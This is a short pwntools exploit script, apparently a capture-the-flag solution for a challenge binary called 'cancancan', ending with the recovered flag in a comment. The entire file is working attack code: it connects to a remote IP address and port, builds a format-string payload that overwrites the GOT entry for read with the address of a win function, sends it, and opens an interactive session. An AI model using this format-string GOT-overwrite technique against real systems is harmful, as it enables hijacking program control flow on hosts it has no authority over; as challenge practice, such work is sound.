
from pwn import *

context(arch = 'i386', os = 'linux')

r = remote('35.246.42.94', 31337)
# r = process('./cancancan')

r.readline()

got_read = 0x0804C00C
win = 0x08049236

p = fmtstr_payload(6, {got_read: win})

r.sendline(p)
r.interactive()

# GrabCON{Byp4ss_can4ry_1s_fun!}

